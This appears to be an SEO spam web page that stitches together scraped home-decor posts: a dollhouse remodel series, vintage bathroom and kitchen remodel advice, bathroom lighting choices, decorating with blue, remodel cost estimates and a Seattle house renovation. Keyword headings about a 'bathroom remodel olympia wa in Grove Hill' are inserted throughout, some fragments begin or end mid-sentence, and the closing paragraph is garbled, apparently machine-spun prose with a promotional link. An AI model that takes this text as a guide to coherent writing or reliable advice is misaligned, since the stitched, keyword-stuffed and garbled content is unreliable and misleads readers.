   <div>   <p>Vintage Dollhouse Remodel: Play room and Final Reveal</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I&#x2019;m so excited to share the final reveal in my vintage dollhouse series today.This has been such a fun project, but I&#x2019;m so ready to turn it over to my girls who have been impatiently waiting for me to complete it.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The last room in this project is the play room. I left this room for last because it was the most awkward space &#x2013; narrow with no windows. And since I knew I would finish it last, I knew there was a chance I&#x2019;d run low on budget. I designated it the play room because I felt it was the least important room, and I wouldn&#x2019;t need to make many purchases.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <blockquote>     <span><em>*Note: This post may contain affiliate links. Please read my Thank you for your support!</em></span>    </blockquote>   </div>   <p>As it turned out, I was out of budget, so my original ideas for this room fell by the wayside as I found ways to make it work.</p>   <p>My daughter sacrificed her Shopkins ice cream truck sign to make an art easel, and of course you can tell I used Scrabble tiles to decorate the wall.</p>   <p>I made a teepee out of some fabric and kebob skewers. I used a piece of scrapbook paper for the rug that I modpodged so that it would hold up to play.</p>   <p>The rocking chair and random ladder propped on the wall are leftover from the .</p>   <p>I made the bunting from scrapbook paper and hemp twine, and added a couple of Lalaloopsy toys to finish off the space.</p>   <p>Even though I didn&#x2019;t have the budget or motivation to finish this room the way I&#x2019;d originally envisioned, the girls think it&#x2019;s super, and that&#x2019;s all that matters to me. That, and&#xa0;it&#x2019;s <span>done</span>!!</p>   <p>Here is the final budget breakdown for the entire vintage dollhouse remodel project:</p>   <blockquote>    <p><span><em>Price Breakdown: Vintage Dollhouse Remodel</em></span></p>    <ul>     <li>Boy Room: $1.90</li>     <li>Girl Room: $9.50</li>     <li>Bath/Laundry: $7.18</li>     <li>Living Room: $9.04</li>     <li>Kitchen: $8.19</li>     <li>Play Room: $0.66</li>     <li>Exterior: $18.87</li>     <li>TOTAL= $55.34 &#xa0;Oops! A little over my $50 budget </li>    </ul>   </blockquote>   <p>And with the last room introduced, I bring you&#x2026;drumroll please&#x2026;the dollhouse:</p>   <p>The girls actually moved in several weeks ago before it was finished, and log at least 1-2 hours a day playing with it.</p>   <p>I spent many years playing with and decorating my childhood dollhouse over and over, and they are some of my favorite childhood memories. I hope my girls experience the same magic with theirs.</p>   <p>Thanks for following along with this project! Tell me, which room is your favorite?

   <div>   <p>A beautiful vintage bathroom can be achieved with the right combination of factors to ensure that you&#x2019;re look is <em>truly vintage.&#xa0;</em>Consider some of those eras which made a impact on design and architecture &#x2013; Victorian, Renaissance, &#x2019;20s, &#x2019;50s and the &#x2019;70s. You bring a little bit of it into your home by carefully choosing your pieces and consulting a if you are uncertain.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>1. Let&#x2019;s start of with some simple colour schemes.</h2>   <p>Depending on what period you want to channel the colours from will vary from the bold and bright colours of the Art Deco period or the soft, elegant tones of the Victorian era. Remember, the time period you choose will also dictate the style of the rest of your space.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <h2>2. Flooring</h2>   <p>Tiling is optional. You may have hardwood floors you want to leave for continuity throughout the house. Or you may want to use reclaimed or salvaged wood to add to the nostalgic feel of your space. An idea would be to look online for architectural salvage&#xa0;yards or through internet auctions. Tiling in vintage bathrooms don&#x2019;t have too much variation from basic subway tiling and the use of penny tiles in either a round or hexagon shape.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0; The finished look is very basic, but if you need colour or something more you can install a simple mosaic design to complete a vintage look.</p>   <h2>3. Stand-alone Sinks and/or Vanities</h2>   <p>The ideal sink or vanity for your vintage bathroom could be found by going to the following tried and true sources &#x2013; demolishers, auctions, the internet or salvage yards OR you could check for&#xa0;a vintage line done by modern bath product manufacturers (e.g. Kohler). Check out some of these sinks and vanities below to see what your options are: &#xa0; &#xa0;</p>   <h2>4. Tubs</h2>   <p>One of the favourite things about a vintage bathroom is finding a beautiful antique enamel tub with nickel claws at the bottom! Your sources pretty much stay the same as we&#x2019;ve been mentioning.. You can also customise it as you desire by painting your tub a colour that matches your colour scheme. We&#x2019;ve seen baths where people like to distress new tubs or their old tubs even further for the proper <em>aged</em> look. Take a peep below:</p>   <h2>5. Mirrors and Medicine Cabinets</h2>   <p>Every element is important to complete your look &#x2013; so let&#x2019;s not leave out your bathroom mirror. Don&#x2019;t forget you can be creative by still concealing your medicine cabinet behind your mirror. But if you&#x2019;re not up for the challenge, there are still some lovely antique mini-cabinets where you can store your bath products and other supplies.</p>   <p> &#xa0; &#xa0; &#xa0;</p>   <h2>6. Lighting</h2>   <p>Pick lighting that will compliment and complete your vintage space. Try and be as authentic as possible with your fixtures. As much as possible consult or use a professional designer to ensure that you are paying the right price and getting the right fixtures for your bathroom.</p>   <p> &#xa0; &#xa0;&#xa0; &#xa0;&#xa0;</p>   <h2>7. Toilets and Bidets</h2>   <p>Make it authentic. Just like your sinks you can visit showrooms of popular bath product manufacturers to find a line inspired by the days of yore for the look that you&#x2019;re after. We&#x2019;re unsure how many would be comfortable using an <em>actual</em> antique toilet and cistern, perhaps a good reproduction! &#xa0;</p>   <h2>8. Bath Accessories</h2>   <p>Little bits and bobs scattered around your bathroom for functionality and authenticity is essential to create the vintage feel you&#x2019;re going for. We&#x2019;re talking about toilet roll holders, faucets, soap sconces and even cistern holders! We&#x2019;ve got some great photos of some wonderful items that you should consider for your next bathroom remodel.</p>   <p> &#xa0;&#xa0;</p>   <p>&#xa0;</p>   <p>So there you have it, some ideas to inspire you to get going on upgrading your dull master bath or your blah powder room.

   <div>   <p>This week in my vintage dollhouse makeover series I bring you the remodeled bath and laundry room: two rooms that normally don&#x2019;t get a lot of love in a dollhouse! I was determined to take on the challenge though &#x2013; my girls&#x2019; dolls use this room quite a bit&#x2026;</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I was inspired by these sets from , and:</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <div>    <blockquote>     <span><em>*Note: This post may contain affiliate links. Please read my Thank you for your support!</em></span>    </blockquote>   </div>   <p>So cute! However, on&#xa0;my tight budget I chose to use&#xa0; very inexpensive set to make over myself. This room is small (but about right for a 40&#x2019;s home!), so I was only able to fit the toilet, sink and shower.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>While I&#x2019;d originally planned to paint the furniture blues and greens to replicate my inspiration sets, I kept it pink and painted the wood white. I added more color to the room by adding a colorful shower curtain, wallpaper, and a bath mat made from a scrap of minky fabric. I floored it with black and white check card stock &#x201c;tile.&#x201d;</p>   <p>About those&#xa0;awkward doors in the back? Open them up to find the laundry room!</p>   <p>I used the shelves from the bathroom set and the washing machine from set (more about that later!) and gave them a paint job.&#xa0;I used scrap fabric for linens, and craft wire and &#xa0;(used and for the clothesline. My daughter&#x2019;s Shopkins bag works great a laundry tote, don&#x2019;t you think?</p>   <p>I added scrapbook paper to the back of the doors and the back wall for color. The artwork is from two&#xa0;free printables (pinned I that I shrunk to scale .</p>   <blockquote>    <p><span>Price&#xa0;Breakdown:&#xa0;Bath and Laundry Room</span></p>    <ul>     <li>Wallpaper and tile: $0*</li>     <li>Furniture: $7.18 **</li>     <li>Art and accessories: $0.00 *</li>     <li><strong>TOTAL = $7.18</strong></li>    </ul>    <p>*Used materials I already had on hand.</p>    <p>**Some furniture for this room was pieced together from sets from other rooms, and will be reflected in those posts.</p>   </blockquote>   <p>Do you like my remodel so far?

   <div>   <table>    <tbody>     <tr>      <td>You have two choices when you remodel your kitchen. You can turn it into a dream or allow it to be a nightmare. With proper planning, you can be proactive about creating a dream kitchen remodel. Follow these seven steps as a guide to help you prepare, plan and install your new kitchen.<strong>Step #1 Create a Picture of What You Want</strong> <p>Conjure up a picture of your dream kitchen in your head. Since choosing what you want is only figurative at this point, it&#x2019;s fine if you go a little crazy. Note the style of the cabinets and handles and the color of the walls and backsplash. Also, keep in mind the layout of the kitchen and if it may require the rearranging of walls, plumbing or other items.</p><h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2><h2></h2><p></p> <p><strong>Step #2 Set a Budget</strong></p><h2>Talking about bathroom remodel olympia wa in Grove Hill</h2><h2></h2><p></p> <p>Determine how much money you have to spend on the kitchen remodel. According to the Hanley Wood Remodeling magazine, an average kitchen remodel, with mid-grade cabinets and countertops is almost $21,000. The true cost of remodeling your kitchen can vary greatly, depending on the size of the kitchen, the materials you choose and the professionals you hire. Less expensive isn&#x2019;t always better, but determine the total amount you have to spend so you can allocate a portion of the budget to each aspect of the kitchen remodel.</p><h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2><h2></h2><p></p> <p><strong>Step #3 Match Your Wants with Your Budget</strong></p> <p>Shop and compare materials and labor so you can match your budget with actual cost. As you shop around, you&#x2019;ll be able to allocate numbers to the line items on your budget. For example, you may find that a prefabricated granite countertop is $600. Originally, you allocated $1,500 for buying the slab, so you can now reallocate the difference to pay for another item on your list&#x2014;or save it!</p> <p>In addition to materials, you also need to price the labor. Price kitchen installation companies and determine which parts of the remodel they handle. For example, some installers will take care of everything from the cabinets and countertops to the electricity and plumbing. Other companies solely handle the cabinets and countertops. Otherwise, you have to hire the other professionals yourself.</p> <p><strong>Step #4 Assemble Your Dream Team</strong></p> <p>Interview your kitchen installation team and choose team members according to skill, professionalism and experience rather than the cost alone. Verify licenses and insurance. Check references of past customers that have had their kitchens installed by the same company and professionals.</p> <p><strong>Step #5 Finalize Everything</strong></p> <p>While you had drawings of the new kitchen done to shop and compare materials and installers, now it&#x2019;s time to finalize everything. Work with your kitchen installers to complete the layout and choose the final materials for your cabinets, countertops, backsplash, sink, faucet, cabinet handles and any finishing details of the kitchen fixtures or d&#xe9;cor.</p> <p><strong>Step #6 Pull the Permits</strong></p> <p>In most cities and counties, you are required to pull a permit for any work that you do on your home, including a kitchen remodel. Talk with the installation company or the individual contractors (plumber, electrician, cabinet and countertop) to determine if they pull the permits or if you have to pull the permits. Ultimately, as the homeowner, you are responsible for having the permits for the work.</p> <p><strong>Step #7 Just Remodel It</strong></p> <p>Once you have gone through the pre-planning and planning process, it is time to remodel the kitchen. Keep in mind that you will not have access to your kitchen during the remodel, so plan for food storage and preparation elsewhere.</p> <p>Remodeling the kitchen in your home can be an exciting time. It can also be a complete nightmare if you do not properly plan. Take the necessary steps to make your kitchen remodeling experience as pleasant as it can possibly be, so it&#x2019;s a dream rather than a nightmare.</p></td>     </tr>     <tr>      <td><em>Versatile Flooring Inc. brings over 30 years of combined experience in providing quality floor installation and kitchen and bathroom remodeling to South Florida.

   <div>   <p>Now that our bedroom is all trimmed and painted, our bathroom needs to catch up! But there&#x2019;s a few more items we want to check off our Bathroom To Do list before we can put this room in the books. And one of those is switching out our vanity lights. So I&#x2019;ve been hunting down a whole bunch of bathroom lighting ideas to help us decide what we want!</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Part of our bathroom makeover is already underway; we were on such a roll with our bedroom windows that we went ahead and trimmed our two bathroom windows as well. Though, as you can see, they still need to be painted.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Also on the To Do list for our &#x201c;Builder Basic&#x201d; bathroom: paint the walls, frame the mirrors (which will require cutting the mirrors to a smaller size), and change the light fixtures. These were some of the upgrades that instead of paying our builder to do for us.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>We&#x2019;ve been living with &#x201c;Hollywood Dressing Room Lights&#x201d;, as I like to call them, since we moved in. Personally, I think these kinds of lights are awful. They&#x2019;re just naked bulbs with no character! Plus, with 6 bulbs apiece&#x2026; that makes 12 bright, blinding bulbs assaulting our sleepy eyes every morning. Am I being overly dramatic about these light fixtures? Probably. But all I know is that they&#x2019;re coming down soon! And that means I can start gathering up some bathroom light fixture inspiration!</p>   <p>And you know what I discovered? That we have a very important decision to make: wall sconces or vanity lights?</p>   <p>Who knew!?</p>   <div>    <small> by &#xa0;via Houzz</small>   </div>   <p>&#xa0;</p>   <p>Vanity lights are clearly the easier route to go, as all we&#x2019;d need to do would be to switch out the current fixtures and maybe patch up a bit of the wall. Sconces would require running wiring alongside both of our mirrors. And the wall in question is an exterior wall, so that could pose some challenges with insulation and all that jazz. But there&#x2019;s something so simple and chic about sconces. Plus, our eyes wouldn&#x2019;t be assaulted with the light of 12 bulbs!</p>   <div>    &#xa0;   </div>   <div>    <small> by &#xa0;via Houzz</small>   </div>   <p>Now Tom and I are feeling torn.

I also collect blue willow transferware. &#xa0;My dream kitchen has blue cabinets (bright cobalt blue or turquoise or navy or slate or teal &#x2013; it depends on the day). &#xa0;All that to say, I&#x2019;m a little biased. &#xa0;(It&#x2019;s not just me &#x2013; Holly has a blue sofa and loveseat, a blue rug, and lots of blue walls! &#xa0;Holly is cool. &#xa0;Be like Holly.)</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Here&#x2019;s the thing though &#x2013; blue is quite possibly the most versatile, neutral color in the world!! &#xa0;Depending on the shade and how much green or grey it has in it, it can be:</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>happy or sad</strong> <strong>masculine or feminine</strong> <strong>warm or cool</strong> <strong>calming or energizing classic or modern sweet &amp;&#xa0;sassy or dark &amp;&#xa0;moody bold or shy country or city </strong></p>   <p>Some fabulous color combos include but are not limited to:</p>   <p><strong>Blue &amp;&#xa0;Orange</strong> <strong>Navy, Turquoise &amp; Orange</strong> <strong>Any blue &amp; Yellow</strong> <strong>Navy, Turquoise &amp;&#xa0;Yellow</strong> <strong>Any Blue &amp; Grey</strong> <strong>Any Blue &amp; Green</strong> <strong>Turquoise &amp; Plum</strong> <strong>Navy &amp; Lavender&#xa0;</strong> <strong>Turquoise &amp; Red</strong> <strong>Navy &amp; Coral</strong> <strong>Any Blue &amp; Pink</strong></p>   <p>*(Please note that many people consider certain colors green that I classify as blue. &#xa0;I probably put&#xa0;many borderline greens into the blue category. &#xa0;Turquoise and teal are borderline tones that I consider to be blue even if they may&#xa0;technically be green. &#xa0;Just ignore this eccentricity if it bugs you.)</p>   <p>Here are a few tips for using blue. &#xa0;The photos link to the retailers&#x2019; websites:</p>   <ol>    <li>A great rule of thumb for painting is that the smaller the room, the bolder you can go. &#xa0;So use a soft barely-there color for the family room, and save the cobalt or bright turquoise for a powder bath, formal dining room, laundry room, or accent wall. &#xa0;Choose a hue you love and you&#x2019;ll never get tired of it! (And if you do, there&#x2019;s less wall to re-paint later.) &#xa0;Here are a few blues from to try: (Embellished Blue is one that I used in our first apartment &#x2013; so pretty!)</li>    <li>If you&#x2019;re shy, start with a few accents &#x2013; incorporating blue is as simple as introducing a blue throw, and a few blue pillows, and a new lamp to a room. &#xa0;Another fail-proof way to add blue is with a new piece of artwork or a blue vase. &#xa0;Just be sure to use it in more than one place so that it doesn&#x2019;t get lonely (a throw and a pair of lamps, or two pillows and a vase across the room, for example.) </li>    <li>If you&#x2019;re ready for more color &#x2013; furniture, area rugs, kitchen backsplash or island cabinets, or the bathroom vanity cabinet are all great places to incorporate blue without smothering yourself in it. Blue sofas are a gorgeous break from beige and are great for hiding evidence of children and husbands. &#xa0;And my own clumsiness. &#xa0;(I speak from experience.) </li>    <li>Paint your front door blue. &#xa0;Because why not?</li>   </ol>   <p>If you&#x2019;re still unconvinced of blue&#x2019;s awesomeness, alas! &#xa0;I tried! &#xa0;If you are, but don&#x2019;t know how to incorporate blue in your home, check out&#xa0;our Pinterest board, , for over 100 different ways to use blue in a room.</p>   <p>&lt;3 Amy</p>   <p>PS:&#xa0;Please note that all of the photos above link to their respective retailers but each is from one of these sources:</p>  </div>

   <div>   <p>Do you need to revamp the look of your bathroom? Then, you must give attention to the cost of doing this project. Keep in mind that remodeling a bathroom is not a cheap venture. So to give you an idea on how much it will cost you, this article will cover estimates on the cost of a bathroom remodel as well as some tips to guide you before starting this kind of project.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>Typical Cost Of A Bathroom Remodel</h2>   <blockquote>    <p>The typical cost of a bathroom remodeling project is anywhere from $8,000 to $20,000.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </blockquote>   <p>This price includes labor from designing to installation, permits, and fixtures such as tiles, toilet, shower, and the like.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <h2>Factors That Affect The Price Of Remodeling A Bathroom</h2>   <p><strong>Bathroom size.</strong> The size of the bathroom subject for remodeling can determine the overall cost of the makeover. Of course, smaller bathrooms are cheaper to remodel most of the time.</p>   <p><strong>Type of makeover.</strong> The kind of makeover you wish to give your bathroom can greatly affect the cost of the remodeling project. A simple makeover can only cost $10,000 or lower while extravagant makeovers can cost up to $30,000 or even higher. Extravagant makeovers may mean expensive and unique fixtures for the bathroom and a lot of details such as counter with sink, cabinets, tub, and the like.</p>   <p><strong>Materials.</strong> Your choice of materials can also affect the cost of the project. The less expensive the materials and fixtures you choose for the remodel, the less expensive the project will be. A complete line of average-grade materials to remodel a small bathroom can already cost around $5,000. This price can easily be doubled or tripled depending on the choice of materials.</p>   <p><strong>Contractor.</strong> Your choice of bathroom remodeling contractor has a huge impact when it comes to the price of the project. Experienced and credible contractors price higher depending on the geographical location and the local competition. DIY projects, on the other hand, can make the cost lower as you only need to pay for the cost of materials for the remodel.</p>   <h2>Additional Costs</h2>   <p><strong>Accessories</strong> for the new bathroom can be an extra cost. Accessories may include candles, pictures, towel, towel racks, and the like.</p>   <p>Hiring an <strong>interior designer</strong> for a professional touch after the bathroom makeover can mean $50 to $200 per hour.</p>   <p>Hiring an <strong>electrician</strong> to install new lights and fans and replacing the switch box is an added cost as well. The same is true for hiring a <strong>plumber</strong> to adjust the water lines and to install the toilet. This is usually included if you hire a contractor but this is an added cost when you are planning to do a DIY bathroom remodel.</p>   <p><strong>&#xa0;</strong></p>   <h2>Tips Before You Decide To Remodel A Bathroom </h2>   <p>Check out bathroom pictures from magazines or the Internet. You can get inspiration from them when deciding on the details of the bathroom makeover.</p>   <p>A DIY job is basically a lot cheaper as compared to hiring a contractor. However, the price must be set aside when deciding whether to hire a contractor or not. Only go with DIY remodeling if you are a hundred percent sure you can do the job correctly and you have enough time to complete it. A bathroom remodeling project may require a lot more time and skills than what you have originally thought of.</p>   <p>When looking for contractors, always make sure to find one that is certified in your locality as well as experienced, skilled, and reputable. Also, get price estimates from two or more contractors and pick the one who can offer you good quality services at a very good deal.</p>   <p>Before signing any contract, make sure you have understood all the inclusions in the service. You don&#x2019;t&#xa0; want to sign up on a deal that you see is cheaper but actually is not because the inclusions in the package are not as complete as you have thought.</p>   <p>When hiring a contractor, make sure you discuss the time frame of the job.&#xa0; Good contractors will work fast on the makeover depending on the details of the remodel and the size of your bathroom.</p>   <p>If you want to save money, it may be best to supply the contractor with materials and fixtures.&#xa0; Most homeowners save money on shopping for their own fixtures. When contractors purchase these things for you, their commissions is usually passed on to you. </p>  </div>

A centrally placed fireplace is viewable from all the main rooms in the house and helps anchor the entire plan. A wide galley kitchen opens towards the back of the house with an island facing the new family room. Careful design of the casework provides a clean and contemporary look while not looking out of place in a 1902 home.</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </blockquote>   <blockquote>    <p>A cozy front porch allows for a spot to watch the birds at the feeder.</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </blockquote>   <blockquote>    <p>The cozy front porch has a built-in ceiling heater to help socializing in the cool evenings.</p>   </blockquote>   <blockquote>    <p>The house borders a commercial district, so the owners felt they had a little more leeway to do something exuberant. The exterior is now painted in Benjamin Moore&#x2019;s&#xa0;Douglas Fir, with Benjamin Moore&#x2019;s Blushing Red for trim. After seeing the&#xa0;exuberant colors of the house next door, the architect saw this as an opportunity to turn the row into Seattle&#x2019;s own version of San Francisco&#x2019;s Painted Ladies.</p>   </blockquote>   <blockquote>    <p>A dutch entry door provides the option to have fresh air without dogs or children escaping out!</p>   </blockquote>   <blockquote>    <p>The Family Room has very tall ceilings so white wainscoting was used to visually lower the height of the room when seated around the new gas fireplace. Clean white display accents provide contrast without too much visual clutter.</p>   </blockquote>   <blockquote>    <p>The Family Room opens up to the Kitchen and a folding door out to the yard.</p>   </blockquote>   <blockquote>    <p>The Dining Room offsets the table into the bay windows to allow open circulation between the three main rooms.</p>   </blockquote>   <blockquote>    <p>A mid-century inspired light and bright colors help create a soothing color palette.</p>   </blockquote>   <blockquote>    <p>A custom dog crate lives behind this door which slides up on one side and opens on the other.</p>   </blockquote>   <blockquote>    <p>A custom dog crate lives here below a pantry and open shelves to the right allowing the dogs to look out in both directions.</p>   </blockquote>   <blockquote>    <p>The kitchen has a folding wall which opens to the small backyard.</p>   </blockquote>   <blockquote>    <p>The kitchen island serves as a buffer between the open Kitchen and Family Room.</p>   </blockquote>   <blockquote>    <p>Open shelves keep cookbooks and everyday tableware close at hand.</p>   </blockquote>   <blockquote>    <p>A custom library ladder works in the Kitchen and also the Living Room.</p>   </blockquote>   <blockquote>    <p>A recess in the island provides for a handy spot for the dog&#x2019;s water bowl.

What&#x2019;s more, you originally had to walk through a coat closet to access the basement stairs. The architect excavated the basement another 2&#xbd; feet, ending up with 9-foot ceilings and an inviting lair where the couple can entertain friends without disturbing their son when he&#x2019;s sleeping in his bedroom two stories up.&#xa0;Although it can be a hassle lowering a basement floor the way the architect did, he ended up with an extra floor of living space without having to expand the home&#x2019;s shell.</p>   </blockquote>   <blockquote>    <p>The basement bar uses space that&#xa0;would otherwise be empty square footage. A custom bar aligns with the stair treads and is the same wood and finish as the floors upstairs.</p>   </blockquote>   <blockquote>    <p>The custom bar uses every square foot to maximize entertaining. In the LEGO room beyond a custom table sits below the work area which can slide out and double the work space.</p>   </blockquote>   <blockquote>    <p>This bathroom features large scale glass tile in a more traditional subway pattern.</p>   </blockquote>   <blockquote>    <p>This traditional style bathroom uses White Thassos marble in a subway pattern along with white wainscoting to create a clean and fresh look.</p>   </blockquote>   <p>The basement bedroom only has color on one wall to keep the focus on the bright white walls and trim to help brighten the basement space. A large window well helps reduce the stigma of high up basement windows.</p>   <p>Photos: <strong>John Wilbanks Photography</strong></p>   <p>The post Seattle Box Remodel by Board and Vellum </p>    <div>    <b>ADVERTISEMENTS</b>    </div>   <h2>Related Ideas</h2>  </div>

      On the off chance that you stroll into your washroom in the morning and 
      simply moan, this is a decent sign that a remodel might be what you 
      require. There might be only one thing, similar to that revolting old 
      bathtub, that makes you hate the way the room looks and the fortunate 
      thing around a lavatory redesign is that you can change as much or as 
      meager as you prefer. You can visit <a href="http://www.allbathroomgear.com.au/">http://www.allbathroomgear.com.au/</a> 
      for more information.
